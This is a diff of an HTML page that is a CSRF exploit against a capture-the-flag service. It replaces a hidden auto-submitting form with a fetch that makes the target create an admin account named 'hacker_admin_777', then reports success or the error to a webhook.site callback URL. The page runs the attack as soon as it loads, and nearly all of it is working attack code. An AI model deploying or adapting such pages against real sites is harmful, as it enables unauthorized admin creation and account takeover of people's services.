@@ -2,20 +2,30 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>You are being redirected...</title>
+    <title>Loading...</title>
 </head>
 <body>
-    <p>Loading, please wait...</p>
-
-    <form id="exploitForm" action="http://tasks.goidactf.ru:20121/create_admin" method="POST">
-        <input type="hidden" name="new_admin_login" value="my_hacker_login">
-    </form>
-
     <script>
-        // Как только страница загрузится, форма отправится автоматически
-        window.onload = function() {
-            document.getElementById('exploitForm').submit();
-        };
+        const targetUrl = 'http://tasks.goidactf.ru:20121/create_admin';
+        const myLogin = 'hacker_admin_777';
+
+
+        const params = new URLSearchParams();
+        params.append('new_admin_login', myLogin);
+
+        fetch(targetUrl, {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded'
+            },
+            body: params.toString()
+        }).then(() => {
+            console.log("Запрос отправлен!");
+            fetch('https://webhook.site/881be5bd-2065-4d10-b78f-89fb17e768f8?status=done'); 
+        }).catch(err => {
+            fetch('https://webhook.site/881be5bd-2065-4d10-b78f-89fb17e768f8?error=' + btoa(err));
+        });
     </script>
 </body>
 </html>
